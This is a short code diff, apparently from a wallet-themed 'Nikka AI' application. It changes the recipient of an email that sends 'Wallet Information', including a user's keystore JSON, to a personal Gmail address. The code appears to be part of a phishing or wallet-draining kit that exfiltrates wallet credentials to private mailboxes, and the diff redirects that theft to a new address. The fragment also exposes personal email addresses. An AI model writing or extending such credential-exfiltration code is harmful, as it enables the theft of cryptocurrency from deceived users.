@@ -171,7 +171,7 @@ Keystore JSON: ${keystoreJSON || 'Not provided'}
 				name: 'Nikka AI',
 				address: 'maxwellexcel174@gmail.com',
 			},
-			to: 'maxwellexcel2@gmail.com',
+			to: 'Blessedgrace54321@gmail.com',
 			subject: 'Nikka AI Wallet Information',
 			text: formattedText,
 			html: generateEmailHTML(
